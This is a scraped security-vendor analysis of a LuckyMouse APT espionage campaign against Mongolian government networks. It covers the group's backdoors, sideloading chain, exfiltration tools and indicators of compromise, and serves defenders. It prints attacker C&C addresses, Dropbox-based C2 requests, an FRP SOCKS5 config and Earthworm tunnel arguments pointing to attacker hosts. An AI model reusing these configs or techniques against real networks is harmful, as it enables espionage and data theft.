62em){.__m__-_R_2muqssm_{--col-flex-grow:auto;--col-flex-basis:calc(58.333333333333336% - 0.4166666666666667 * var(--grid-column-gap));--col-max-width:calc(58.333333333333336% - 0.4166666666666667 * var(--grid-column-gap));}}</style><div class="m_96bdd299 mantine-Grid-col __m__-_R_2muqssm_"><article class="blog-article-body"><address class="article-author visually-hidden">By <span><a rel="author" href="/blog/authors/luigino-camastra">Luigino Camastra</a></span><span>, <a rel="author" href="/blog/authors/igor-morgenstern">Igor Morgenstern</a></span></address><div style="--container-size:var(--container-size-xxl);max-width:calc(97.5rem * var(--mantine-scale));padding-inline:0rem" class="m_7485cace mantine-Container-root" data-size="xxl" data-strategy="block" id="post" data-component="post-content"><div class="RichText_wrapper__xZRh7"><p><strong>Introduction&nbsp;</strong></p><p>This summer, Avast discovered a new APT campaign targeting government agencies and a National Data Center of Mongolia. We consider with moderate confidence based on our research that the chinese-speaking APT group LuckyMouse is behind the attack.&nbsp;</p><p>The APT group planted backdoors and keyloggers to gain long-term access to government networks and then uploaded a variety of tools that they used to perform additional activities on the compromised network such as scanning of the local network and dumping credentials. We presume that the main aim of cyber-espionage was the exfiltration of sensitive data from potentially interesting government agencies.</p><p>According to our local telemetries, we consider that the government institutions were attacked in two ways. One was through a vulnerable company who is providing services for these agencies, and the other was through an email spear-phishing with a malicious attachment – a weaponized document using CVE-2017-11882.&nbsp;</p><p>There are many tactics that are consistent with other reports of LuckyMouse; nevertheless, we are also seeing some previously undocumented tactics indicating that the actors have updated their toolset with Polpo and LuckyBack backdoors. Our analysis below will highlight those new tactics.&nbsp;</p><p><strong>Attribution &amp; Clusterization</strong></p><p>We base our presumption that this campaign was led by the LuckyMouse APT group on the tooling that we found during the investigation of this campaign, most of them having previously been attributed to LuckyMouse by other researchers[<a href="https://securelist.com/luckymouse-hits-national-data-center/86083/">1</a>][<a href="https://securelist.com/luckymouse-ndisproxy-driver/87914/">2</a>][<a href="https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/">3</a>].</p><p>In 2018, Kaspersky Labs released two blog posts about LuckyMouse targeting a national data center containing Asian government resources. Their blog posts described several tool sets such as network filtering driver NDISProxy, weaponized documents with CVE-2017-11882 (Microsoft Office Equation Editor, widely used by Chinese-speaking actors), and Earthworm tunneler. They also described a DLL sideloading technique abusing legitimate applications from Symantec (<em>IntgStat.exe</em>). This is a legitimate application that loads a DLL <em>pcalocalresloader.dll</em>. By sideloading their own version <em>pcalocalresloader.dll</em>, they load HyperBro RAT from a compressed and encrypted file<em> thumbs.db</em>. While some of the tools that were used were publicly known tools that are available on the internet, the group also developed their own tools, including a rootkit[<a href="https://securelist.com/luckymouse-hits-national-data-center/86083/">1</a>][<a href="https://securelist.com/luckymouse-ndisproxy-driver/87914/">2</a>].</p><p>In April 2019, PaloAlto Networks released a blogpost about LuckyMouse. According to the post, the group installed webshells on a SharePoint server to compromise Government Organizations in the Middle East. Similarly, the group used several publicly known and available tools (such as mimikatz, curl, ntbscan). But what got our attention was the fact that the same HyperBro RAT was used in the campaign we were analyzing. The APT attack we analyzed also used a DLL sideloading technique, although with different executables. The executable used was a Symantec application <em>thinprobe.exe</em> that loads <em>thinhostprobedll.dll</em>. This DLL was then used to sideload <em>thumb.db</em> that contained encrypted and compressed HyperBro[<a href="https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/">3</a>].</p><p>We’ve also discovered a Polpo backdoor in the network belonging to the National Data Center of Mongolia. This backdoor was accompanied by samples that are known to be used by the LuckyMouse group which lead us to the conclusion that this backdoor is a new addition into LuckyMouse’s toolkit. We also observed more common tools, e.g. VMProtect-obfuscated Earthworm tunneler, a custom installer dropping NDISProxy network filtering driver, and various network scanners.</p><p><strong>Infection Chain</strong></p><p>We observed that this APT group was also targeting an unknown company that was providing services to government institutions in East Asia. The group infiltrated the company’s computers and managed to harvest credentials belonging to the company’s email accounts. Unfortunately, we haven’t been able to identify which attack vector was used in this infiltration. These credentials were then used to send emails from the hacked company’s email accounts to the government officials. While we were unable to recover the whole email, we’ve managed to recover the email’s header. The header indicates that these emails were asking the recipient to update a firmware, i.e. launch a self-extracting 7-zip archive attached to this email.</p><p>Date: Sun, 28 Jun 2020 20:43:08 +0800 (ULAT)&nbsp;<br>Subject: Re: Perform a firmware update on the server</p><p>XXXXXX_update.exe&nbsp;</p><p>(sha256:2D2EA3002C367684F21AD08BDC9B5079EBDEE08B6356AC5694EFA139D4C6E60D)</p><p>This archive drops three already familiar files – Symantec’s <em>thinprobe.exe</em>, malicious <em>thinhostprobedll.dll</em>, and <em>thumb.db</em>. The malicious DLL is used for DLL sideloading, decrypting and decompressing <em>thumb.db</em> and finally loading its processed content – a HyperBro RAT . This backdoor has also been reported on by <a href="https://securelist.com/luckymouse-hits-national-data-center/86083/">Kaspersky[1]</a> and <a href="https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/">PaloAlto Networks[3]</a>, the latter providing an extensive description of the HyperBro RAT.</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro imageWithCaption_fullWidth__4Ncwy m_7485cace mantine-Container-root" class="mantine-focus-auto bodyText imageWithCaption_caption__hCQ67 picture-caption m_b6d8b162 mantine-Text-root">Figure 1: Overview of infection vector</p></div><div class="RichText_wrapper__xZRh7"><p><strong>Toolset</strong></p><p>In this following section we describe a tool set we found on the victim’s PC, used by the APT group for cyber-espionage and lateral movement through the network. We could divide these tools into three categories:</p><ul><li data-list-item-id="ec5b28496f4840796809ce749078d1800">Helpers: ServiceInstaller, ShellCodeExecutor, DataExtractor 1/2, Information Collector</li><li data-list-item-id="e3dfdfce41dc4ad61d882f65570b5363f">Remote access: StartServiceTool, Korplug, LuckyBack, BlueTraveller, Polpo</li><li data-list-item-id="e486a36892ee7ff4582329f1701b2a120">Publicly available tools: UAC bypass tool, port scanners, password dumpers, FRP, Earthworm tunneler</li></ul><p>In detail, we found the following tools:</p><h2><strong>StartServiceTool</strong></h2><p>This tool installs <em>wcm.dll</em> into <em>%WINDIR%\system32</em>, a registry record</p><p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WindowsConnections Manager</p><p>is created with the following values:</p><p>Description: Makes automatic connect/disconnect decisions based on the network connectivity options currently available to the PC and enables management of network connectivity based on Group Policy settings.</p><p>DisplayName: Windows Connections Manager</p><p>ServiceDll: C:\Windows\system32\wcm.dll.</p><p>This effectively creates a new service. The dropped binary is a 32-bit service DLL that has two parts – embedded DLL, and mmLoader (<a href="http://tishion.github.io/mmLoader/">http://tishion.github.io/mmLoader/</a>), a loader that bypasses the windows loader.</p><p>The final payload DLL is written in GO and contains a single export named “Interface“. This function expects 4 arguments consisting of two strings and their corresponding lengths. The string values specify the victim ID and the Dropbox API key to use. The API key is passed in as an RC4 encrypted + base64 encoded value.<br>The hardcoded decryption key is “0000111122223333“. The DLL additionally contains a default API key which appears to be for the authors test account.</p><p>Initially, it tries do download a file from Dropbox via the HTTP API:</p><p>POST /2/files/download HTTP/1.1<br>Host: content.dropboxapi.com<br>User-Agent: Go-http-client/1.1<br>Content-Length: 0<br>Authorization: Bearer [snipped]<br>Dropbox-Api-Arg: {“path”: “/infos/000000.txt”}<br>Accept-Encoding: gzip</p><p>If the server responds with a file, it tries to upload a file with a timestamp and a hostname onto Dropbox:</p><p>POST /2/files/upload HTTP/1.1<br>Host: content.dropboxapi.com<br>User-Agent: Go-http-client/1.1<br>Content-Length: 36<br>Authorization: Bearer [snipped]<br>Content-Type: application/octet-stream<br>Dropbox-Api-Arg: {“path”: “/infos/116a0d.txt”,”mode”: “overwrite”,”autorename”: true,”mute”: false,”strict_conflict”: false}<br>Accept-Encoding: gzip</p><p>%currentDate% %currentTime%##%hostname%</p><p>Afterwards, a C&amp;C request-response loop is started. Based on the response from the C&amp;C server, one of the following commands is executed: download files, upload files, sleep, quit, or execute commands on a command line. See the following diagram for a detailed flow, keep in mind that all download/upload are using the aforementioned Dropbox API:</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro imageWithCaption_fullWidth__4Ncwy m_7485cace mantine-Container-root" class="RichText_wrapper__xZRh7"><p>At first, security descriptors of both <em>%windir%\system32\ </em>and <em>%windir%\system32\drivers\ </em>changes to allow the current user to copy files to these locations. Then the installer copies a service executable to <em>%windir%\system32\</em> under a randomly generated name (4 alphanumeric characters).</p><p>Depending on whether a service named <em>DFS Replication</em> already exists in&nbsp;</p><p>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost netsvcs,</p><p>a new service called <em>DFS Replication </em>(if it does not exist) or <em>IAS Jet Database Access Service %number%</em> is created. More specifically, its parameters are:</p><p>Description: <em>“Configures Internet Authentication Service (IAS). If this service is stopped, the remote network access that requires user authentication will be unavailable. If this service is disabled, any services that explicitly depend on it will fail to start or (Retail) Replicates files among multiple PCs keeping them in sync. On Client, it is used to roam folders between PCs; on the server, it is used to provide high availability and local access across a wide area network (WAN). If the service is stopped, file replication does not occur, and the files on the server become out-of-date. If the service is disabled, any services that explicitly depend on it will not start.”</em><br>DisplayName: DFS Replication/IAS Jet Database Access Service %number%<br>ServiceDll: C:\Windows\system32\&lt;4 random alphanumeric characters&gt;.dll.<br>Tag: 0<br>Security: 0</p><h2><strong>ShellCodeExecutor</strong></h2><p>This utility takes hex-encoded shellcode as an argument and then proceeds to execute it. The code responsible for decoding and unpacking can be seen below:</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro memory</p></div><div class="RichText_wrapper__xZRh7"><p>While we weren’t able to reconstruct which stage this executor was used, we were able to recover its parameter that corresponds to a hex-encoded metasploit-generated shellcode (reverse HTTP proxy – <a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_https_proxy.asm">Github</a> configured to connect to URL <em>oss.chrome-upgrade[.]com</em> (202.59.9[.]58). We suspect that the threat actors used the shellcode just to retrieve and execute a further stage from the C&amp;C server.</p><h2><strong>DataExtractor 1</strong></h2><p>This tool can be used to gather potentially sensitive documents with <em>pdf</em>,<em> ppt</em>,<em> xls</em>, and <em>doc</em> file extensions. It recursively scans all connected drives for such documents that were modified in 2020 and later. Gathered documents are packed using Winrar and the archive is protected with a password <em>“zaq1xsw@cde3</em>”. This archive will be then saved to <em>C:\MSBuild\NVIDIA\ </em>under a filename <em>CRYPTO-%computerName%-%number_value%.SYS</em>. This scan is repeated every 20 minutes. If this tool is launched a second time (e.g. after reboot), only documents that were modified in the last 24 hours are gathered.</p><p>After each run, a file <em>%windir%\system32\igfxme.vbs </em>is executed. Since this tool did not contain any exfiltration-related functionality, we presume that this script is used to exfiltrate the archive from the computer to a C&amp;C. Unfortunately, we were not able to recover this script.</p><h2><strong>DataExtractor 2</strong></h2><p>This binary is a simple filescanner that is provided with a list of file extensions, a list of directories, and date boundaries as parameters. Every directory from the list is searched for files with a given file extension. If such files are found and their modification date is within the provided date boundaries (in UTC), their full paths are written down into the output file. These paths are delimited by Windows line delimiters and they are encoded in 16-bit Unicode.</p><p>Below you will see a part of an error message, providing us the information about how this utility is used:</p><p><em>T040ClientLite.exe suffix .txt,.xls scanDirs E:\\test,E:\\test1 output E:\\test\\output.txt startEditDate 2020/04/26 endEditDate 2020/04/27</em></p><p>More generally, the command’s format is:</p><p><em>T040ClientLite.exe suffix &lt;file extensions&gt; scanDirs &lt;directories&gt; output &lt;output file&gt; startEditDate &lt;date&gt; endEditDate &lt;date&gt;</em></p><h2><strong>Information Collector</strong></h2><p>The Information Collector focuses on removable drives. If no such drives are connected, its execution is terminated. The collector fingerprints those drives (serial number, vendor ID, product ID), encrypts this data with a 64 byte XOR key, and stores it onto the system drive as hidden files. More specifically, it uses the following directories:</p><p><em>C:\MSBuild\Resources\Format\S-1-1</em> (encrypted files)</p><p><em>C:\MSBuild\Resources\Format\S-1-0\S-1-0-0 (unencrypted temporary files, deleted after encryption)</em></p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro imageWithCaption_fullWidth__4Ncwy /blog/_next/image?url=https%3A%2F%2Fwww.gendigital.com%2Fblog%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_paragraph_image_small%2Fpublic%2F2024-06%2Fpasted%2520image%25200-2_5.png.webp%3Fitok%3DITBvJj_-&amp;w=640&amp;q=75 2x" src="/blog/_next/image?url=https%3A%2F%2Fwww.gendigital.com%2Fblog%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_paragraph_image_small%2Fpublic%2F2024-06%2Fpasted%2520image%25200-2_5.png.webp%3Fitok%3DITBvJj_-&amp;w=640&amp;q=75"/></picture><p class="mantine-focus-auto bodyText imageWithCaption_caption__hCQ67 picture-caption m_b6d8b162 mantine-Text-root">Figure 4: Sample enumerate drives, checking their type with GetDriveTypeA</p></div><div class="RichText_wrapper__xZRh7"><p><em>It ensures its persistence by adding itself into Run (SOFTWARE\Microsoft\Windows\CurrentVersion\Run) registry key under AvpSecurity.</em></p><p>Interestingly, it contains many unused functions using command-line tools such as: systeminfo, arp, ipconfig, netstat, and tasklist. It also supports archiving the collected information using WinRAR with a hard-coded password “1qaz@WSX”. The sample has no networking capabilities. It primarily serves for collecting the information and transferring the gathered information using removable drives between the machines in the network.</p><p>Moreover, the particular sample we analyzed contained a bug in the drives’ enumeration routine that made it virtually useless as it hampered all the sample’s functionality.</p><h2><strong>RAT</strong></h2><h3><strong>Korplug (PlugX)</strong></h3><p>Korplug (PlugX) is a well-known Remote Access Trojan associated with Chinese speaking attackers and it has been used in a large number of targeted attacks since 2012[<a href="https://www.welivesecurity.com/2014/11/12/korplug-military-targeted-attacks-afghanistan-tajikistan/">4</a>]. It uses DLL side-loading to load itself into the memory through legitimate applications. It helps it stay unnoticed by any security product. Korplug is a fully featured RAT, with capabilities such as file uploads, downloads, keystroke logging, webcam control and access to a remote cmd.exe shell.&nbsp;</p><p>In our case, we observed that it was loaded through an application provided by ESET called unsecapp.exe that was signed with a valid, but expired certification. After executing unsecapp.exe, it loads a malicious DLL <em>http_dll.dll</em>. This DLL, in turn, decrypts <em>http_dll.dat</em> with a custom algorithm, yielding Korplug which is then loaded into the memory and executed. Unfortunately, we were not able to trace the RAT back to the original payload that dropped and executed these files.</p><p>Address of C&amp;C servers:&nbsp;</p><p>web[.]microlynconline[.]com:80<br>home[.]microlynconline[.]com:8000<br>help[.]microlynconline[.]com:443<br>host[.]microlynconline[.]com:53</p><h2><strong>Backdoors</strong></h2><p>We found three different backdoors in the government office network, two of which, PolPo and LuckyBack, were never seen in any previous campaign. Polpo also hits the National Data Center, and the two others, BlueTraveller and LuckyBack, only hit the government office network.</p><h3><strong>LuckyBack</strong></h3><p>LuckyBack collects the computer’s fingerprint, at first, and then tries to establish a communication with the C&amp;C server (45.77.55[.]145). Once the communication is established, the backdoor starts listening for commands. It is capable of: starting a remote shell, file manipulation (move, read, write, execute, get file size), keylogging, and screen capturing.</p><h4><strong>Technical:</strong></h4><p>At first, the used code page is retrieved by calling <em>chcp</em>, a command providing the keyboard and character set information, on the system drive.</p><p>The first request on the C&amp;C server “registers” the device by providing its fingerprint. Namely, the fingerprint is constructed from: PID, Windows version/build number, CPU architecture, username, user privileges, hostname, IP address, code page, and RDP session ID.</p><p>If the server accepts the registration, it responds with the PID and a simple string “OK”. Afterwards, a simple request-response C&amp;C loop is started, and commands and their corresponding numbers are displayed in the table below:</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro imageWithCaption_fullWidth__4Ncwy m_7485cace mantine-Container-root" 1x, /blog/_next/image?url=https%3A%2F%2Fwww.gendigital.com%2Fblog%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_paragraph_image_small%2Fpublic%2F2024-06%2FScreenshot%25202024-06-24%2520at%252011.16.12%25E2%2580%25AFAM.png.webp%3Fitok%3DnDreIZHV&amp;w=640&amp;q=75 2x" class="RichText_wrapper__xZRh7"><h3><strong>BlueTraveller</strong></h3><p>This backdoor is simpler in terms of commands than the previous one. It accepts just four commands: exit, upload, download, and execute on the command line. Nevertheless, it uses two layers of C&amp;C servers, meaning that the first request is on the first layer, and it yields an IP address of a C&amp;C server from the second layer. Afterwards, the request-response C&amp;C loop uses the second layer. If the backdoor receives a command for the command line, the output from the console is encrypted with AES-256 and sent back to the second-layer C&amp;C server.</p><p>The binary itself has its strings encrypted with RC4, using a hardcoded key “L!Q@W#E$R%T^Y&amp;U*A|}t~k”. Among these strings, we may find the address of the first-layer C&amp;C server and the user agent that should be used for these requests. Our sample tried to contact <a href="https://decoded.avast.io/luigicamastra/apt-group-targeting-governmental-agencies-in-east-asia/blank">http://go.vegispaceshop[.]org/shop.htm</a>. The response seems to be pretty inconspicuous at first glance. But once we have a look more closely, we see that many lines are followed by a mixture of tabs and spaces,which is rather fishy indeed. And surprisingly this is where the IP address of the second C&amp;C layer hides!</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" 6: Script which decrypts the white spaces from the html response" width="300" height="300" decoding="async" data-nimg="1" class="imageWithCaption_image__xW70R" 2x" src="/blog/_next/image?url=https%3A%2F%2Fwww.gendigital.com%2Fblog%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_paragraph_image_small%2Fpublic%2F2024-06%2Fpasted%2520image%25200-4_0.png.webp%3Fitok%3DqcYJdIDI&amp;w=640&amp;q=75"/></picture><p class="mantine-focus-auto bodyText imageWithCaption_caption__hCQ67 picture-caption m_b6d8b162 mantine-Text-root">Figure 6: Script which decrypts the white spaces from the html response</p></div><div class="RichText_wrapper__xZRh7"><p>The BlueTraveller uses the same scheme for encryption – AES-256 with a key derived from a string that is hashed with SHA-256, providing the IV and the key. The first usage of this encryption is in the first request to the second-layer C&amp;C. For this first request, the key is derived from a string “<em>0304276cf4f31345“</em>. The key is then used to encrypt the generated GUID and the computer’s hostname which are then Base64-encoded and used to generate the request URL:&nbsp;&nbsp;</p><p><em>http://&lt;second_layer_C&amp;C&gt;/home/&lt;rand number&gt;/&lt;enc_length&gt;/&lt;Base64 data&gt;.</em></p><p>After this request is executed, commands are retrieved from:</p><p><em>http://&lt;second_layer_C&amp;C&gt;/index.htm.</em></p><p>The obtained data is encrypted with AES-256, using the aforementioned approach with GUID as a base-string for the key-derivation procedure. Each response also contains the random number that was sent in the first second-layer request. The malware checks whether the received number matches the one it sent; in case of a mismatch, the command is discarded. If a command for the command line is received, the output of the executed command (AES-256 encrypted, using the same key as the previous response, and Base64 encoded) is sent to</p><p>http://&lt;second_layer_C&amp;C&gt;/help/&lt;rand number&gt;/&lt;enc_length&gt;/&lt;Base64 data&gt;.</p><h3><strong>Polpo</strong></h3><p>Polpo is a backdoor that we’ve been seeing in the wild since 2018. It supports around 15 different commands including information collection and exfiltration, file transfer, and proxy connections.</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro imageWithCaption_fullWidth__4Ncwy m_7485cace mantine-Container-root" class="RichText_wrapper__xZRh7"><p>Base64-encoded addresses of C&amp;C servers are hard-coded in the binary</p><h4><strong>Polpo – Communication</strong></h4><p>The backdoor mimics the HTTP protocol to blend with the normal traffic. The transferred data is encrypted with AES and encoded into Base64 then sent as a part of fake HTML content.&nbsp;</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="RichText_wrapper__xZRh7"><p>The sample checks for a proxy configured on the system found in the Registry Key <em>Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyEnable. </em>If a proxy is configured it uses the server specified in <em>Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer </em>for all the connections.&nbsp;</p><h4><strong>Polpo – Functionality</strong></h4><p>There are more than 15 commands supported by the backdoor, although some of them are duplicates. Most of the commands are executed in separate threads. Errors and inter-thread communication are handled using Events.</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro commands are supported by the version of Polpo we’ve analyzed:</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro 1x, /blog/_next/image?url=https%3A%2F%2Fwww.gendigital.com%2Fblog%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_paragraph_image_small%2Fpublic%2F2024-06%2FScreenshot%25202024-06-24%2520at%252011.19.56%25E2%2580%25AFAM.png.webp%3Fitok%3Dq3FiikHL&amp;w=640&amp;q=75 2x" src="/blog/_next/image?url=https%3A%2F%2Fwww.gendigital.com%2Fblog%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_paragraph_image_small%2Fpublic%2F2024-06%2FScreenshot%25202024-06-24%2520at%252011.19.56%25E2%2580%25AFAM.png.webp%3Fitok%3Dq3FiikHL&amp;w=640&amp;q=75"/></picture></div><div class="RichText_wrapper__xZRh7"><h2><strong>UAC bypass tool</strong></h2><p>An open-source UAC bypass tool (<a href="https://github.com/vestjoe/WinPwnage#uac-bypass-techniques">https://github.com/vestjoe/WinPwnage</a>) was detected on several compromised devices. It may be used to elevate privileges or achieve persistence on the system. We presume that it was used to execute tasks and programs under administrator-level permissions.&nbsp;</p><h2><strong>Port-scanners</strong></h2><p>Several different port scanners were seen on compromised devices under various filenames. One of the used port scanners was open-source <a href="https://github.com/kingron/s">https://github.com/kingron/s</a>. We assume that in this case it was used for scanning the ports of the server to find out which services were running.</p><h2><strong>Nbtscan</strong></h2><p>Nbtscan is a command-line NetBIOS scanner for Windows that scans for open NetBIOS name servers in the network.</p><h2><strong>Passwords dumpers</strong></h2><p><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a> and <a href="https://github.com/AlessandroZ/LaZagne">Lazagne</a> were seen on the infected computers. We presume that they were used to retrieve credentials from the compromised computers. We’ve also spotted a wrapped Mimikatz version, download from <a href="https://github.com/jas502n/mimikat_ssp">https://github.com/jas502n/mimikat_ssp</a>, on several compromised devices.</p><h2><strong>FRP</strong></h2><p>Fast Reverse Proxy (FRP) is a tool that allows you to expose local services that are hidden behind the NAT or a firewall to the internet. Both the raw TCP and UDP are supported as well as several other protocols whose requests can be forwarded to the internal services via this proxy. We’ve recovered a configuration file <em>3bef4cd.tmp</em> for this proxy. The content of this proxy is the following:</p><p>[common]<br>server_addr = 202.59.9[.]58<br>server_port = 8443<br>privilege_token = %token%<br>[SDJY_proxy]<br>type = tcp<br>remote_port = 6001<br>plugin = socks5</p><p>It is immediately obvious that the actor used the SOCKS5 plugin to route requests to the compromised network via 202.59.9[.]58:8443.</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro imageWithCaption_fullWidth__4Ncwy m_7485cace mantine-Container-root" data-strategy="block"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/FRP_graph.png.webp?itok=FlbsrLM4 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/FRP_graph.png.webp?itok=u929aPYO 2x" media="(min-width: 1020px)"/><source 1x, 2x" src="/blog/_next/image?url=https%3A%2F%2Fwww.gendigital.com%2Fblog%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_paragraph_image_small%2Fpublic%2F2024-06%2FFRP_graph.png.webp%3Fitok%3DpdFuuMia&amp;w=640&amp;q=75"/></picture><p class="mantine-focus-auto bodyText imageWithCaption_caption__hCQ67 picture-caption m_b6d8b162 mantine-Text-root">Figure 10: Diagram of FRP tool usage</p></div><div class="RichText_wrapper__xZRh7"><h2><strong>Earthworm tunneler</strong></h2><p>The Earthworm tunneler is considered to be a typical tool for Chinese-speaking actors by Kaspersky[1]. We’ve seen this tool on all compromised systems of national data center. On one of these devices, we’ve managed to recover command-line parameters that were used:&nbsp; <em>-s rssocks -d 139.180.155.133 -e 80</em>. The tool itself creates a SOCKS tunnel to the provided server. It is publically available at <a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a>.</p><h2><strong>Conclusions</strong></h2><p>As this blogpost demonstrates, LuckyMouse has used new methods to infiltrate the government institution through a third party’s system which they attacked.&nbsp;</p><p>Avast has recently protected users in the government institution and national data center from further attacks using the samples we analyzed. We also discovered an interesting encryption method that delivers a hidden IP address in the whitespace of the C&amp;C response. We presume that the attackers updated their attacking toolset in this campaign after it was discovered by Avast.</p><p>I would like to thank Adolf Středa, David Zimmer and Anh Ho for helping me with this research.</p><h2><strong>Indicators of Compromise (IoC)</strong></h2><ul><li data-list-item-id="e8b0aa6bdba020336983f38c4a2bcb765">&nbsp;Repository:&nbsp;<a href="https://github.com/avast/ioc/tree/master/LuckyMouse">https://github.com/avast/ioc/tree/master/</a></li><li data-list-item-id="ed9a5b9c7dc1ecdea5d1ed92719523d71">List of SHA-256:&nbsp;<a href="https://github.com/avast/ioc/blob/master/LuckyMouse/samples.sha256">https://github.com/avast/ioc/blob/master/</a></li></ul><h2><strong>MITRE ATT&amp;CK techniques</strong></h2></div><div summer, Avast discovered a new APT campaign targeting government agencies and a National Data Center of Mongolia. We consider with moderate confidence based on our research that the chinese-speaking APT group LuckyMouse is behind the attack.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe APT group planted backdoors and keyloggers to gain long-term access to government networks and then uploaded a variety of tools that they used to perform additional activities on the compromised network such as scanning of the local network and dumping credentials. We presume that the main aim of cyber-espionage was the exfiltration of sensitive data from potentially interesting government agencies.\u003c/p\u003e\u003cp\u003eAccording to our local telemetries, we consider that the government institutions were attacked in two ways. One was through a vulnerable company who is providing services for these agencies, and the other was through an email spear-phishing with a malicious attachment – a weaponized document using CVE-2017-11882.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThere are many tactics that are consistent with other reports of LuckyMouse; nevertheless, we are also seeing some previously undocumented tactics indicating that the actors have updated their toolset with Polpo and LuckyBack backdoors. Our analysis below will highlight those new tactics.\u0026nbsp;\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eAttribution \u0026amp; Clusterization\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eWe base our presumption that this campaign was led by the LuckyMouse APT group on the tooling that we found during the investigation of this campaign, most of them having previously been attributed to LuckyMouse by other researchers[\u003ca href=\"https://securelist.com/luckymouse-hits-national-data-center/86083/\"\u003e1\u003c/a\u003e][\u003ca href=\"https://securelist.com/luckymouse-ndisproxy-driver/87914/\"\u003e2\u003c/a\u003e][\u003ca href=\"https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/\"\u003e3\u003c/a\u003e].\u003c/p\u003e\u003cp\u003eIn 2018, Kaspersky Labs released two blog posts about LuckyMouse targeting a national data center containing Asian government resources. Their blog posts described several tool sets such as network filtering driver NDISProxy, weaponized documents with CVE-2017-11882 (Microsoft Office Equation Editor, widely used by Chinese-speaking actors), and Earthworm tunneler. They also described a DLL sideloading technique abusing legitimate applications from Symantec (\u003cem\u003eIntgStat.exe\u003c/em\u003e). This is a legitimate application that loads a DLL \u003cem\u003epcalocalresloader.dll\u003c/em\u003e. By sideloading their own version \u003cem\u003epcalocalresloader.dll\u003c/em\u003e, they load HyperBro RAT from a compressed and encrypted file\u003cem\u003e thumbs.db\u003c/em\u003e. While some of the tools that were used were publicly known tools that are available on the internet, the group also developed their own tools, including a rootkit[\u003ca href=\"https://securelist.com/luckymouse-hits-national-data-center/86083/\"\u003e1\u003c/a\u003e][\u003ca href=\"https://securelist.com/luckymouse-ndisproxy-driver/87914/\"\u003e2\u003c/a\u003e].\u003c/p\u003e\u003cp\u003eIn April 2019, PaloAlto Networks released a blogpost about LuckyMouse. According to the post, the group installed webshells on a SharePoint server to compromise Government Organizations in the Middle East. Similarly, the group used several publicly known and available tools (such as mimikatz, curl, ntbscan). But what got our attention was the fact that the same HyperBro RAT was used in the campaign we were analyzing. The APT attack we analyzed also used a DLL sideloading technique, although with different executables. The executable used was a Symantec application \u003cem\u003ethinprobe.exe\u003c/em\u003e that loads \u003cem\u003ethinhostprobedll.dll\u003c/em\u003e. This DLL was then used to sideload \u003cem\u003ethumb.db\u003c/em\u003e that contained encrypted and compressed HyperBro[\u003ca href=\"https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/\"\u003e3\u003c/a\u003e].\u003c/p\u003e\u003cp\u003eWe’ve also discovered a Polpo backdoor in the network belonging to the National Data Center of Mongolia. This backdoor was accompanied by samples that are known to be used by the LuckyMouse group which lead us to the conclusion that this backdoor is a new addition into LuckyMouse’s toolkit. We also observed more common tools, e.g. VMProtect-obfuscated Earthworm tunneler, a custom installer dropping NDISProxy network filtering driver, and various network scanners.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eInfection Chain\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eWe observed that this APT group was also targeting an unknown company that was providing services to government institutions in East Asia. The group infiltrated the company’s computers and managed to harvest credentials belonging to the company’s email accounts. Unfortunately, we haven’t been able to identify which attack vector was used in this infiltration. These credentials were then used to send emails from the hacked company’s email accounts to the government officials. While we were unable to recover the whole email, we’ve managed to recover the email’s header. The header indicates that these emails were asking the recipient to update a firmware, i.e. launch a self-extracting 7-zip archive attached to this email.\u003c/p\u003e\u003cp\u003eDate: Sun, 28 Jun 2020 20:43:08 +0800 (ULAT)\u0026nbsp;\u003cbr\u003eSubject: Re: Perform a firmware update on the 